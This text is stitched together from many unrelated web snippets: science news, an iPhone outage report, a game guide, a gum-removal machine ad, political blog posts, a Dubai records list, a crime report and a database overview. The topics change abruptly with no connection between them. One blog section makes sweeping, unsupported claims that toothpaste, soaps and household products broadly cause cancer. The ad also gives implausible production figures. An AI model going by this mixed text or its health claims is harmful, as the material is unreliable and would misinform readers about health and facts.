According to Science Daily , cyanobacteria can convert up to 10 percent of the sun ’s energy into biomass .
This is a drastic improvement over the 1 percent rate of crops like corn and sugarcane , as well as the 5 percent rate of algae .
With such a high conversion rate , cyanobacteria could replace a hefty amount of fossil fuels without taking up too much land .
At a recent conference organized by the European Science Foundation ( ESF ) , participants discussed how photosynthesis evolved by cyanobacteria produced our current fossil fuel supply .
Now the objective is to use those same reactions to produce more fuel — without taking fossil fuels out of the ground .
These reactions could theoretically be created with an artificial leaf system consisting of self - assembling nanodevices that regenerate themselves much like real plants and cyanobacteria do .
But we wo n’t see such a system on the market anytime soon — the technology will be in development for another 10 to 20 years .
In the meantime , however , algae appears to be the most promising biofuel contender .

SAN FRANCISCO 
For many people on Friday , the iPhone was the iCan’t .
Apple suffered extensive network gridlock Friday morning , as many of the six million users of the original iPhone tried to upgrade to new software while the first buyers of the new iPhone 3G were trying to activate their purchases .
The setback was a classic example of the problems that can follow when complex systems have single points of failure .
In this case , the company appeared to almost invite the problems by having both existing and new iPhone owners try to get through to its systems at the same time .
“ There are certainly lessons in preparedness , ” said Richard Doherty , a consumer electronics industry consultant who is president of the Envisioneering Group in Seaford , N.Y .
He compared the day with Christmas morning , “ the acid test for many years ” for electronics companies because customers contact them in droves after opening presents and trying to get gadgets to work .
The Fox News website posts a “ No Spin Poll ” asking “ What is the most biased news outlet in America ? ” and gives four choices .
Ironically , none of the choices is Fox News itself :
from eyje .
The choices are the New York Times , MSNBC , Associated Press , and NPR .
Gee , I guess they forgot the Washington Post !
Seeing as drum machines are pretty ubiquitous in music these days , the idea of a machine that plays the drums does n't sound all that groundbreaking .

Now are you impressed ?
I thought so .

TF2 Arena keeps the class diversity of Team Fortress 2 while focusing goals around combat between two teams .
Where other game modes lean towards a broad overall strategy for the team over a number of lives , Arena concentrates on the specific tactical choices the teams make in a single fight .
Arena features smaller maps that play out in shorter periods of time .
The round ends once one team has no players left in the arena , or when the central capture point has unlocked and been captured .
Rounds tend to be very fast and highly competitive , with an emphasis on your team ’s class makeup and your plan to counter the opposing team ’s class choices .
Arena mode is great for smaller matches of three vs. three players , while still comfortably supporting huge knockdown twelve - on - twelve brawls .
Health pick - ups are limited in TF2 Arena ( some levels do n’t have any Health packs at all ) so being careful is a good strategy for any class .
As well , with so little health available , having a Medic or a Health dispenser - building Engineer on your team can be a crucial element to success .
With their reconnaissance abilities , the Scout and Spy play a far more vital role in Arena than in other game modes .
Knowing the location of the enemy team can often mean the difference between a win and a loss .
The Soldier and Demoman will find many areas in Arena specifically designed for them to get a vertical advantage .
Traditional Heavy / Medic pairings will still be highly useful as the anchor to a good Arena team .
However , commit too far in this direction and the enemy can quickly overwhelm you with Snipers and Spies .
In Arena , water is as scarce as Health .
This makes the Pyro a much deadlier class , as any enemy player he sets on fire with his flamethrower or flare gun will be unable to put out the flames .
Igniting enemies quickly , then retreating to safety , can be an effective strategy for the Pyro .

Chewing Gum Removal Machines
Daimer 's chewing gum removal equipment pricing is up to 1/3 that of our competitors .
We offer the best chewing gum removal systems and values in the industry to remove chewing gum from concrete , pavement , sidewalks ... at a rate of 100s of pieces / day !
We feature heavy duty stainless steel brushes and extraction while other brands offer no vacuum capability to extract the residue , and they offer soft brass brushes that wear quickly .
Daimer conforms to EPA regulations .
Everyone these days , especially teenagers and young people find eating chewing gum very " cool " and fashionable .
You will see people chewing gum whether in schools , colleges , theaters , pubs , hotels , or virtually everywhere .
The problem arises when people are careless about disposing of their chewing gum .
Some just spit it on the pavement , theater corridors , carpeting , and other surfaces .
Chewing gum litter has been and continues to be a rampant issue , and one creating health hazards .
In schools and colleges , some students dispose of gum under desks , which can create a very unhealthy situation when another student happens to touch the gum ; he places his hands to his mouth and transfers germs .
The same transfer of bacteria happens in under tables in restaurants when children touch gum and then place their hands in their mouths .
If you have noticed black chewing gum spots on sidewalks , jogging tracks , pavement , driveways , parking lots , you would agree how ugly and unsightly it looks .
Education and awareness is important so children , teenagers and everyone who eats chewing gum will dispose of it properly in a basket or barrel .
Unfortunately , people will just continue to discard it wherever they like , thus the persistent problem will continue to plague society .
Chewing Gum and Chewing Gum Litter : Did You Know ?
According to some sources , worldwide chewing gum production during 2005 was approximately 650 metric tons .
Further , the estimate says that the figure will reach over 1 billion tons in 5 years .
The U.S. is the world 's leading country in chewing gum consumption and hence the problem of tackling chewing gum litter in the USA is grave .
Chewing gum does not break down even over a period of time , so when gum is discarded improperly on pavement or elsewhere the resulting substance accumulates and is extremely difficult to remove .
In the U.S chewing gum sales is about $ 2 billion a year .
Further , the cost for chewing gum removal is around $ 2- $ 3 per piece of gum .
Penalties must be imposed for chewing gum litter to bring the situation under control .
It has been estimated that approximately 28 million people in the UK buy around 935 million packs of gum each year and £ 400 million are spent by Local Authorities in street cleaning each year .
Cleaning Chewing Gum Litter
Janitors who are assigned the jobs to clean facilities like school campuses , or hotels etc. often find the task of cleaning chewing gum quite tedious and difficult .
In hotels , for example , housekeeping and janitorial staff must contend with ugly , sticky gums on carpets , upholstered furniture , stairs , elevators and elsewhere .
Local authorities everywhere are faced with the growing issue of chewing gum litter and clean - up .
In schools and colleges the job of cleaning chewing gum on sidewalks and walls is a difficult one .
You can also find chewing gum litter at / on :
Pavements and walkways , school grounds , university campuses , government and corporate buildings , retail stores , shopping malls , open spaces and stadiums , amusement parks , carpets and upholstery
Chewing gum litter is a breeding ground for harmful bacteria and ruins the surface over a period of time .
Chewing gum removal normally requires rigorous rubbing and cleaning activities which can also harm the surface whether carpet or hard floors ; therefore , prevention is best rather than needing to clean chewing gum ..
Features that Make Daimer Chewing Gum Removing Machines the Best Machines in the Market
Gum wads stuck on surfaces , such as concrete , brick , pavers , and most indoor floor surfaces , are not just eyesores , but also extremely unhygienic and difficult to get eliminate .
Traditional cleaning techniques of scrubbing , cleaning , and wiping are time consuming and require too much effort .
Therefore , steam cleaner machines that create high temperatures and come with specialized gum removal kits are required for efficient chewing gum removal .
Daimer®'s KleenJet® chewing gum removal vapor steam cleaners are ideal for eliminating blackened and hardened gum pieces in areas like schools , restaurants , movie theatres , shopping malls , stadiums , gymnasiums , and more .
The commercial steam cleaner machines are capable of removing many pieces of gum per day .
Features of Daimer® Chewing Gum Remover Machines
Chewing gum removal machines from the company come with advanced technologies , such as continuous refill and Advanced Thermal Ionic Sanitization ® ( ATIS® ) , HEPA Filtration and wet and dry vacuum features , pressure levels as high as 125 psi and temperatures up to 369 ºF , stainless steel boilers and boiler scale reduction technology , and more .
The continuous refill technology allows operators to add water to the machine while it is still functional .
The chewing gum removal vapor steam cleaner need not be turned off for the purpose .
The boiler maintains a high level of super hot water into which colder water from the non-pressurized water tank is mixed .
The technology saves users the time to first depressurize the system , refill it , and then reheat it .
The whole process would otherwise take up to 40 minutes with other brands ' models .
The chewing gum removal systems available with the company 's patent - pending ATIS ® technology have a kill rate of up to 99.999 percent of many kinds of harmful bacteria , such as E - Coli , S. aureus , and more .
All its machines featuring this technology come with an EPA number for authenticity .
So , these chewing gum removal vapor steam cleaner machines not just clean , but sanitize the surfaces as well .
The HEPA Filtration technique filters allergens up to 3 microns in size for extra protection .
The wet vacuuming feature eliminates the need to use towels by extracting moisture completely .
Therefore , the machines first melt the gum pieces with hot steam and then extract the residue , leaving the surfaces spotless and virtually germ free .
Some of the machines feature an extraction chamber size of 14 litres .
Stainless steel boilers maintain high temperatures throughout the operation , and the scale reduction technology prevents the formation of scale buildup in the boiler .
This also increases the life of the boiler .
Moreover , inline heating elements available with Daimer® 's chewing gum removal equipment heat water to high temperatures within minutes .
Chewing Gum Removal Kit Available with Daimer®'s Gum Remover Equipment
The kit includes the double squeegee gum removal tool with six heavy gauge stainless steel brushes and Daimer® 's chewing gum removal solution .
One gallon of the concentrated gum removing liquid forms nearly 11 gallons of ready - to - use solution that is completely eco-friendly .
The chemical mixed steam easily breaks the bond between the surface and the gum , and melts even the most tough gum deposits in no time .
More Information Apart from cleaning chewing gum from pavement or sidewalks , or any other surfaces , Daimer® 's KleenJet ® steam vacuum cleaners can also be used for various other cleaning applications , such as auto detailing ; cleaning and sanitizing knobs , mirrors , bathroom walls , stalls , sinks , and urinals ; cleaning tile and grout surfaces in restrooms ; and removing grease from kitchens .
Accessories available with a machine are also important for efficient cleaning .
Therefore , Daimer® vapor steam cleaner machines come with a host of accessories , such as plush microfiber towels , brushes of various sizes and shapes , steam hoses , and more .
Most importantly , Daimer® gum remover machines can be used for removing chewing gum on carpet .
The user simply needs to attach the right brush to do so .
Dr Izzat Atiya of Egypt 's al - Azhar University said it offered a way around segregation of the sexes at work .
His fatwa stated the act would make the man symbolically related to the woman and preclude any sexual relations .
The president of al - Azhar denounced the fatwa , which Dr Atiya has since retracted , as defamatory to Islam .
According to Islamic tradition , or Hadith , breast - feeding establishes a degree of maternal relation , even if a woman nurses a child who is not biologically hers .
' Family bond '
In his fatwa , Dr Atiya , the head of al - Azhar 's Department of Hadith , said such teachings could equally apply to adults .
He said that if a woman fed a male colleague " directly from her breast " at least five times they would establish a family bond and thus be allowed to be alone together at work .
" Breast feeding an adult puts an end to the problem of the private meeting , and does not ban marriage , " he ruled .
" A woman at work can take off the veil or reveal her hair in front of someone whom she breastfed . "
The legal ruling sparked outrage throughout Egypt and the Arab world .
On Sunday , Dr Atiya retracted it , saying it had been the result of a " bad interpretation of a particular case " during the time of the Prophet Muhammad .
Egypt 's minister of religious affairs , Mahmoud Zaqzouq , has called for future fatwas to " be compatible with logic and human nature " .
Soldiers in Iraq are at risk of bomb blast injuries A colour - changing crystal attached to a soldier 's uniform could help doctors decide if they need treatment for a brain injury , researchers say .
The crystal reveals the intensity of a bomb blast the wearer has been exposed to , helping doctors treat injuries that might not be immediately apparent .
Shockwaves from bomb blasts can cause brain damage not visible on MRI scans , New Scientist magazine reports .
US researchers recently presented the research at a neurotrauma conference .
MRI scans pick up structural damage , such as bleeds on the brain , excess fluid or skull fractures .
But a shockwave , such as that caused by a bomb can cause damage on a cellular level , with microscopic tears in the brain .
This would not be picked up on a scan but like any brain injury can cause long - term problems with symptoms such as headaches , behaviour change and memory loss .
Professor Shu Yang , from the University of Pennsylvania in Philadelphia , developed the device from a crystalline material which changes colour depending on its structure .
Many injuries fail to show up on MRI scans and yet the damage can be real and very serious
Luke Griggs , Headway
When a shock wave hits the material , which would be in the form of a thin film , like a small sticker , the crystals would change shape and thus colour .
The researchers now need to determine how the colour changes correlate with the degree of neurological damage suffered .
If all goes to plan , doctors will be able to get a measure of the intensity of the blast , which in turn will help them gauge the severity of the brain injury and what treatment to provide .
Force " Depending on the damage , you 'll have different colour intensities , " said Professor Yang .
" Based on that information we can extract how much force the soldier has received . "
Luke Griggs , spokesman from the brain injury association , Headway , said : " We welcome any new initiatives that may help doctors to diagnose and treat brain injuries sustained by soldiers .
" However , the practical benefits of this research may not be seen for many years , if at all .
" In the meantime , it is vital that every effort is made to accurately diagnose and treat brain injuries sustained from bomb blasts .
He added that brain injury can be very difficult to diagnose as there may not be physical signs .
" Many injuries fail to show up on MRI scans and yet the damage can be real and very serious . "

What are these ?
In his diary entry , " Supporting the NRA 's agendas " , Rabbi makes a number of interesting points .
His words are in italics below .
In my experience , even when I fully support the NRA 's agendas , gun people still want to fly off the handle and argue the point .
I support the NRA for different reasons other than their stated agenda .
The National Republican Association sometimes stands for gun rights and sometimes does n't .
They always stand for advancing the Republican Party , which is the major reason to not like them .
Much better is Gun Owners of America .
Gun People think they are being profound when they bring in the argument of the Jews during the German time period 1933 – 1945 .
People bring this argument in and they know nothing of the time period , the social mindset , the moral code , the Jewish mindset , and the culture of Germany .
I know what Rabbi 's getting at , but it just proves the point that people need to be able to defend themselves .
Gun people think they are being profound by making references to other countries and commenting how peaceful that country is with an armed citizenry .
The US is not culturally related to the Swiss , nor is a majority of American men in the military reserves as the Swiss are .
Another example of a country the gun people bring is Israel and the fact people ( mostly military and the reserves ) carry guns and things are just dandy .
The US is not Israel , and Israel is not the US .
We are two different societies , moral codes , and two different national agendas .
This is a dodge not an argument .
All countries are inhabited by Human Beings .
Therefore , we can learn for others .
Their experiences are relevant .
The gun people generally avoid the topic of the abuses of an armed militia in places such as in the case of Rwanda , Iraq , and Somalia .
In Rwanda the government imposed gun control leaving the Tutsi unarmed while the government armed the Hutus .
The problem in Iraq is that it's an artificial construct .
there 's no logic to it 's existence .
The British created it for ease of governing the region .
It should be at least three separate countries .
Somalia is a situation similar to Iraq .
At the root of the problems in these three areas is government intervention .
Gun people completely want to over look America 's genocidal episode in the late 19th century , and we'd rather not read about the slaughter at Wounded Knee when armed militia people killed old people and children .
The problem here was government not armed citizens .
The Founders warned us against having a standing army .
Gun people want guns to defend themselves against armed criminals they say .
But we never have discussed the point where are the criminals getting their guns .
Please do n't bring up the old story of thefts from guns stores – gun stores do not have to report thefts and the argument cannot be supported .
I 'd be happy to discuss this .
Where does Rabbi think criminals get their guns ?
We saw , for example , in the mall shooting not long ago , the gun people ran away rather than stopping the armed criminal .
Not a single person took a position and fired back .
Obviously we do n't have the fortitude to back our words .
This is too vague .
Which mall shooting is Rabbi referring to ?
Gun people claim they are preventing a tyrant government , yet , they want to ignore the fact that the NRA is congress ' favorite son and the NRA has gotten everything they want .
However , the gun people want to shout down the First Amendment rights of others and what then is tyranny .
Yes , an armed citizenry can resist a tyrannical government .
What does the NRA have to do with that ?
Nobody is shouting down anyone .
Personally , I rather enjoy these kinds of debates .
Gun people have argued the point that the government is out to take their guns away and there is absolutely no evidence of that being the case and that is called paranoia – a severe psychiatric disorder .
Or , the verbiage is to create a false threat to rally the gun people into a common cause the creation of a common enemy
A quick look at places like the UK and Australia , where guns are banned , should suffice to debunk this one .
In the UK they 're instituting knife control now .
Gun people claim they are preventing another Hitler from coming into power without knowing exactly how Hitler democratically came into power .
Another example used is preventing another Lenin – and the gun people refuse to acknowledge that is was through an armed citizenry that Lenin achieved total power .
Both of these characters came to power through government mechanisms .
Hitler by being elected and Lenin by creating his own government by force .
That does n't change the fact that both wanted a disarmed citizenry that could n't resist their tyranny .
Gun people claim they are law abiding and I wonder how many of them cheat on their taxes , speed , run red lights , and other misdemeanors .
Law abiding means full compliance with the laws of this country – not just obeying a certain set of select laws .
This is irrelevant , there 's nothing wrong with disobeying tyrannical laws : " Rightful liberty is unobstructed action according to our will within limits drawn around us by the equal rights of others .
I do not add ' within the limits of the law , ' because law is often but the tyrant 's will , and always so when it violates the rights of the individual . "
-- Thomas Jefferson
I will not support the NRA , or the gun people , using only the language they only want to hear because that means treated them like three - year - olds .
By giving the NRA everything they want we will see if we are better off in an armed society or worse off .
If we are better off , then we made the right decision .
If we are worse off , then , we did it to ourselves .
By rights , John McCain should be getting hammered on economics .
After all , Mr. McCain proposes continuing the policies of a president who ’s had a truly dismal economic record  job growth under the current administration has been the slowest in 60 years , even slower than job growth under the first President Bush .
And the public blames the White House , giving Mr. Bush spectacularly low ratings on his handling of the economy .
Meanwhile , The Times reports that , according to associates , Mr. McCain still “ dials up ” Phil Gramm , the former senator who resigned as co-chairman of the campaign after calling America a “ nation of whiners ” and dismissing the country ’s economic woes as nothing more than a “ mental recession . ”
And Mr. Gramm is still considered a top pick for Treasury secretary .
So Mr. McCain would seem to offer a target a mile wide : a die - hard supporter of failed economic policies who takes his advice from people completely out of touch with the lives of working Americans .
But while polls continue to show that the public , by a large margin , trusts Democrats more than Republicans to handle the economy , recent polling shows that Barack Obama has at best a small edge over Mr. McCain on the issue  four points in a recent Time magazine poll , and he is one point behind according to Rasmussen Reports , which does automated polling .
And Mr. Obama ’s failure to achieve a decisive edge on economic policy is central to his failure to open up a big lead in overall polling .
We 've all heard that the United Arab Emirates has been hard at work constructing the world 's tallest building .
The Burj Dubai currently stands 159 stories tall , and will include 30,000 homes , 9 hotels , 19 residential towers , and the Dubai Mall .
The entire project is estimated to cost $ 20B , but that 's hardly the only thing the UAE likes supersized .
Here are a few other records the tiny nation holds :
World 's Largest Flag
On UAE National Day , a 50,000 square feet flag flew over Abu Dhabi , forming the largest aerial banner ever flown .
World 's Largest Indoor Snow Park
Ski Dubai is 85 m high and 85 m wide .
World 's Longest and Tallest Bridge
The Sixth Crossing will be 1 mile long at 673 feet high , and is expected to be completed by 2012
World 's Largest Mall
Dubai Mall will include the world 's largest aquarium .
World 's First Revolving Tower
55Â º Time Dubai will be a rotation apartment building that offers its residents 360 - degree views across the Dubai cityscape .
World 's Tallest and Only 7 Star Hotel
Burj Al Arab is one of the world 's most expensive hotels , with the Royal Suite going at $ 28,000 a night .
World 's Largest Manmade Island
The Palm are the three largest man-made islands in the world , which are being built on the coast of Dubai .
These islands can be recognized from the moon .
There 's also The World off the coast of Dubai " “ It 's a 300 island archipelago made in the shape of the world map .
World 's Largest Man-made Waterfront
Dubai Marina will soon replace California 's Marina del Rey as the largest man-made marina in the world .
The waterfront will house over 200 high rise buildings as well as some " supertall towers . "
World 's First Luxury Underwater Hotel
The Hydropolis will be 66 feet below the Persian Gulf .
And of course , World 's First Spaceport
The UAE Spaceport in Ras Al - Khaimah , which will offer the world 's first suborbital flights .
But that barely scratches the surface .
The UAE also has the world 's largest indoor pool , the world 's largest passenger hub , the world 's biggest yacht , the first zero- carbon city in the Gulf emirate of Abu Dhabi , among other achievements .
Be sure to read more of what Diana learned today here .
William Yuan , a seventh - grader from Portland , OR , developed a three - dimensional solar cell that absorbs UV as well as visible light .
The combination of the two might greatly improve cell efficiency .
William 's project earned him a $ 25,000 scholarship and a trip to the Library of Congress to accept the award , which is usually given out for research at the graduate level .
“ Current solar cells are flat and can only absorb visible light , ” he said .
“ I came up with an innovative solar cell that absorbs both visible and UV light .
My project focused on finding the optimum solar cell to further increase the light absorption and efficiency and design a nanotube for light - electricity conversion efficiency . ”
You know , that 's just what I was thinking when I was 12 , but my idea did n't quite work .
Well , it was just a paper towel roll with " Solar Rays " written on the side in Sharpie , and I tried to use it to melt G.I .
Joe figures .
But still .
Well done , William !

__UPDATE : __Two great comments were posted below , but to save you from scrolling all the way down :
From Kirk Englehardt , Director of Communication at Georgia Tech Research Institute :
Thank you for sharing this very interesting story .
There is , however , a clarification that needs to be added .
The 3D solar cell was invented several years ago at the Georgia Tech Research Institute by our team of world - class scientists and engineers .
The Georgia Tech Research Institute ( www.gtri.gatech.edu) has been making 3D solar cell prototypes of this design since 2004 .
You can read about the work in our April 2007 news release online .
Our work has patents pending in the US and abroad .
We have also published our research widely in an number of highly regarded research journals including the Journal of Applied Physics , Journal of Materials and Carbon .
The 3D Solar Cell has the potential to be breakthrough in the solar industry .
The global and exclusive license to the 3D Solar Cell intellectual property is held by IP2BIZ in Atlanta .
The license is currently for sale to any firm that can further develop , manufacture and bring it to market .
It is wonderful to see a student taking a real interest in science and math .
We are also happy to hear of William ’s interest in 3D solar cells .
We encourage him to contact the Georgia Tech Research Institute so he may be connected with our lead researcher ( Dr. Jud Ready ) , who would love for him to visit our laboratories to see how we create our photovoltaic cells .
Who knows – maybe William can contribute to our groundbreaking work .
For additional information about this work simply Google " 3D Solar Cell "
And from Susan Harding :
I interviewed William for my story on KATU - TV .
I want to clarify some information .
William researched 3D solar cells for two years , as his own personal homework assignment .
He took research from Georgia Tech , Notre Dame , and a nanotechnology lab at PSU and then enhanced , modified and improved the technology .
Experts with the Davidson scholarship reviewed his work as well as local professors .
And no , he 's not homeschooled .
He goes to a unique public school where they have a special program called Summa .
It 's for kids who are in the 99th percentile in BOTH reading and math .
I have to tell you , when I talked with him I felt like I was talking with a 30 year old professor , he 's so intelligent .
Plus , I hear , he 's a great kid and I have no doubt , he 'll make a wonderful contribution to the world .
Thanks to Kirk and Susan , and to everyone who posted constructive comments .
For years , I have warned people of the danger of personal care products .
If you look at the ingredients manufacturers put in their products -- soaps , deodorants , toothpastes and so on -- you will be horrified .
These ingredients are highly toxic and cause cancer .
They promote leukemia , nervous system disorders and liver problems .
Now , some new information has come from Virginia Tech .
Researchers that have found that the chemical triclosan , which is found in a lot of antimicrobial soaps and toothpaste products , can react with chlorine in the tap water .
Guess what you get ?
( This is the horrifying part . ) Chloroform .
This is a toxic chemical that can give you cancer .
In the old movies , you might have seen someone give a person chloroform to knock them unconscious .
If you breathe enough chloroform , you will die .
If you are brushing your teeth with toothpaste that has triclosan in it , and you are rinsing with tap water that has chlorine in it , you are getting a little chemical reaction right in your mouth .
What a wonderful gift from the toothpaste manufacturers .
That 's not to mention that some of the toothpastes contain fluoride that is n't really fluoride but fluorosilicic acid , which is a toxic waste product that is molecularly similar to fluoride but has a much different effect on the human body -- a toxic effect .
When you wash your hands with antibacterial soap that contains triclosan , you are getting the fumes emitted from this chemical reaction .
Your home could be full of toxic chemicals
Most people 's homes are toxic waste dumps .
They have products that contain triclosan , deodorants that contain aluminum ( absorbed right through your skin ) , shampoos that have toxic fragrance chemicals and hair coloring products that contain cancer - causing chemicals .
There are perfumes and colognes that people just slather on like they are taking a bath in them .
Their senses get dulled , and soon they can't even smell the stuff anymore .
People also put on clothes that have been washed in detergent loaded with fragrance chemicals .
These people run around in these clothes and sweat , which helps the toxicity absorb into the skin and bloodstream where it promotes cancer .
There are fake air fresheners and furniture polishes that contain toxic chemicals .
These products are all promoted as being helpful when really they are quite deadly .
Toothpaste is supposed to help you clean your teeth , but the number one ingredient in toothpaste is calcium carbonate , which is just ground - up seashells that actually mar the enamel on your teeth , giving bacteria a place to hide out and replicate .
Some toothpaste also has formaldehyde in it .
The answer to why you are diseased is that if you are the average American consumer , you are bathing and living in a system of toxic chemicals that you have purchased and brought home .
You use dish detergents that contain toxic chemicals and then eat off of the plates that were washed in them .
How crazy are we in this country that we keep on making products that kill people and putting them on the shelves and printing little " 25 percent off " coupons ?
You are seriously misled if you think you can just wipe out all of the bacteria in your house with antibacterial soap .
Do you think you are going to be germ free ?
Have you checked your doorknobs and your own skin ?
What about your toothbrush ?
I bet there are more colonies of bacteria in your toothbrush than there are people in the entire city in which you live .
These antibacterial products are useless .
They have no value on the market or in your home .
It is all a huge marketing gimmick .
You need immune distress to be healthy
Do you think the microbes on your counter are giving you the flu ?
That 's not what is giving you the flu .
You have the flu because you poison your body with all these other toxic products , metabolic disrupters in the food supply and poor nutrition .
These poisons create a weak body and weakened immune system , allowing opportunistic bacteria to replicate that would n't stand a chance if you had a healthy immune defense in the first place .
Even worse , the use of antimicrobial soaps promotes the spread of superbugs around your house .
If you want to be a healthy individual , you have to have a little immune distress .
If you do n't , your immune system does n't learn how to defend itself .
Your immune system makes a pattern of every invading microbe , and it remembers that pattern forever , so it knows how to beat that invader in the future .
If you try to maintain a sterile environment , then your immune system never gets to learn how to do its job .
You need some level of exposure to these germs or mild infectious agents if you want to have an active immune system .
Let 's talk about fragrances a little more .
Even guys that would n't wear perfume go out and buy laundry detergent that has perfume in it .
When I go to the grocery store , I can't even go near the aisle with all the detergents or I get a headache .
I am very sensitive to this because of my sensory acuity .
I can pick up subtle sights , sounds and smells thanks to a healthy nervous system .
The manufacturers of products that have triclosan in them keep saying that it is perfectly safe and that it only affects the nervous systems of various organisms .
They also say it 's safe because you do n't drink it .
Sure , we are n't swallowing the stuff , but we sure are touching it and bathing in it .
Do you think the skin is impermeable ?
The skin absorbs chemicals , and it can certainly absorb something like triclosan as well .
How do you think the nicotine patch works ?
If nothing was absorbed through the skin , then these patches would n't work .
Studies show triclosan is toxic to your health
This Virginia
Tech study shows that triclosan is a real health hazard .
However , the companies using it are going to say that the study was flawed , and the amount that is used is so minimal that it is well within the safety levels established by the Environmental Protection Agency .
They may claim some other silly nonsense , too , but the truth is this ingredient has no place in or around the human body .
Only fools coat their body with products containing triclosan .
Unfortunately , most people are fooled by this chemical , and they do n't understand its real dangers .
Personally , I do n't need to wash my mouth out with something that is going to create chloroform .
This is basic common sense .
The fact that these products are even being allowed on the shelves defies common sense .
Where has the sanity gone in our consumer products industry ?
It has been replaced by the profit motive .
Triclosan is put into these products for the convenience of the manufacturers .
It will stop their product from going bad , and it allows them to make ridiculous claims on the label .
For example , a label may say , " Proven to kill 99.99 percent of bacteria . "
This sells products , yet it is n't based on any kind of science whatsoever .
If you are new to all this and think everything I just said is crazy , does n't make any sense or is overly worrisome , then do your research .
Do n't believe everything I just said -- start doing some reading on triclosan .
Start reading about aluminum in deodorants and fragrance in shampoos and perfume , and then you will discover the truth for yourself .
You can search Google for information right now .
Just search for " triclosan " and see what you find .
If you do the research and are honest with what you find , you will quickly discover that these products are a hazard to your health .
They are a threat to you and your family and should be outlawed .
They should be reformulated without cancer - causing ingredients .
Of course , that would cost Big Business a lot of money .
Companies use these ingredients because they are cheap .
Where do you think the color comes from in mouthwash ?
It 's from an artificial color chemical .
What most manufacturers care about is moving products , and until Congress demands they stop using harmful ingredients , they 're going to keep doing so .
I encourage you to find out about more about triclosan and stop using products that contain the chemical .
Shop at health food stores .
Stop giving your money to manufacturers who are poisoning and exploiting you for profit .
DALLAS ( Reuters ) - Texas is set to defy the World Court and anger Mexico on Tuesday by executing a Mexican national who was not informed of his right to consular services after his arrest .
Texas , by far America ’s most active death penalty state , condemned Jose Medellin for the 1993 rape and murder of 16 - year - old Elizabeth Pena in Houston .
Another girl was killed in the vicious gang - related assault but Medellin was convicted only of Pena ’s murder .
The World Court last month ordered the U.S. government to “ take all measures necessary ” to halt the upcoming execution of five Mexicans until it makes a final judgment in a dispute over suspects ’ rights .
Medellin is the first of those scheduled to be put to death and the only one so far with a 2008 execution date , according to the Death Penalty Information Center .
Alison Castle , a spokeswoman for Republican Gov. Rick Perry , said the state ’s Board of Pardons and Paroles was considering the case and the governor would most likely make his decision based on its recommendation on Tuesday .
She emphasized the brutal nature of the crime .
“ It ’s very important for the citizens of Texas to remember that Jose Medellin ... brutally and viciously gang raped , stomped , kicked , slashed , strangled and murdered two teenage girls in Houston , ” Castle said .
“ The World Court has no jurisdiction here in Texas .
We ’re concerned about following Texas law and that ’s what we ’re doing . ”
The row , which has strained relations between the United States and Mexico , centers on the fact that the United States failed to inform 51 Mexican citizens sentenced to die in U.S. jails of their right to consular assistance .
“ The impact of ignoring this endangers Americans traveling abroad , ” said Victoria Palacios , a professor at Southern Methodist University ’s Dedman School of Law in Dallas .
AMERICANS ABROAD ENDANGERED ?
“ If the world sees us ignoring the rights of foreign nationals arrested here , there is very little reason for them to recognize the rights of U.S. citizens . ”
She said the case also underscores the gulf between U.S. views of the death penalty and those elsewhere .
Capital punishment has wide political support in America , especially in Texas , which has executed more than 400 prisoners since the Supreme Court lifted a ban on the practice in 1976 .
Political fall - out from the Medellin and related cases has reached the White House and the U.S. Supreme Court .
President George W. Bush directed Texas to comply with a World Court ruling in 2004 mandating review of the cases of Medellin and other Mexicans in U.S. prisons awaiting execution .
The U.S. Supreme Court said in March Bush ’s action had exceeded his authority .
Support for the death penalty may be strong in Texas but opinion on the issue is by no means uniform .
In a recent editorial , The Dallas Morning News urged the governor to halt Medellin ’s execution .
“ Mr. Perry can flex the state ’s judicial muscle and show the world that Texans do n’t bow to the whims of some distant , obscure international court , ” it said .
“ But it would send an unequivocal message to all foreign governments -- especially Mexico -- that this country does n’t stand by its promises . ”
The June 1993 crime for which Medellin was condemned was chilling .
According to the Texas Attorney General ’s office , Pena and her 14 - year - old companion , Jennifer Ertman , were walking home when they encountered a gang initiation .
Medellin and his fellow gang members sexually assaulted , beat and strangled the two girls .
When their badly decomposed bodies were finally recovered , they could only be identified by dental records .

About a week ago , the Facebook Data team quietly released the Cassandra Project on Google Code .
The Cassandra project has been described as a cross between Google 's BigTable and Amazon 's Dynamo storage systems .
An overview of the project is available in the SIGMOD presentation on Cassandra available at SlideShare .
A summary of the salient aspects of the project follows .
The problem Cassandra is aimed at solving is one that plagues social networking sites or any other service that has lots of relationships between users and their data .
In such services , data often needs to be denormalized to prevent having to do lots of joins when performing queries .
However this means the system needs to deal with the increased write traffic due to denormalization .
At this point if you 're using a relational database , you realize you 're pretty much breaking every major rule of relational database design .
Google tackled this problem by coming up with BigTable .
Facebook has followed their lead by developing Cassandra which they admit is inspired by BigTable .
The Cassandra data model is fairly straightforward .
The entire system is a giant table with lots of rows .
Each row is identified by a unique key .
Each row has a column family , which can be thought of as the schema for the row .
A column family can contain thousands of columns which are a tuple of {name , value , timestamp} and / or super columns which are a tuple of {name , column+} where column + means one or more columns .
This is very similar to the data model behind Google 's BigTable .
As I mentioned earlier , denormalized data means you have to be able to handle a lot more writes than you would if storing data in a normalized relational database .
Cassandra has several optimizations to make writes cheaper .
When a write operation occurs , it does n't immediately cause a write to the disk .
Instead the record is updated in memory and the write operation is added to the commit log .
Periodically the list of pending writes is processed and write operations are flushed to disk .
As part of the flushing process the set of pending writes is analyzed and redundant writes eliminated .
Additionally , the writes are sorted so that the disk is written to sequentially thus significantly improving seek time on the hard drive and reducing the impact of random writes to the system .
How important is improving seek time when accessing data on a hard drive ?
It can make the difference between taking hours versus days to flush a hundred gigabytes of writes to a disk .
Disk is the new tape .
Cassandra is described as " always writable " which means that a write operation always returns success even if it fails internally to the system .
This is similar to the model exposed by Amazon 's Dynamo which has an eventual consistency model .
From what I 've read , it is n't clear how writes operations that occur during an internal failure are reconciled and exposed to users of the system .
I 'm sure someone with more knowledge can chime in in the comments .
At first glance , this is a very nice addition to the world of Open Source software by the Facebook team .
Kudos .

REUTERS / Thaier al - Sudani
BAGHDAD ( Reuters ) - Iraqi Prime Minister Prime Nuri al - Maliki said on Monday that an agreement had been reached in negotiations on a security pact with the United States to end any foreign military presence in Iraq by the end of 2011 .
“ There is an agreement actually reached , reached between the two parties on a fixed date which is the end of 2011 to end any foreign presence on Iraqi soil , ” Maliki said in a speech to tribal leaders in the Baghdad ’s heavily fortified Green Zone .
“ Yes , there is major progress on the issue of the negotiations on the security deal , ” Maliki said .
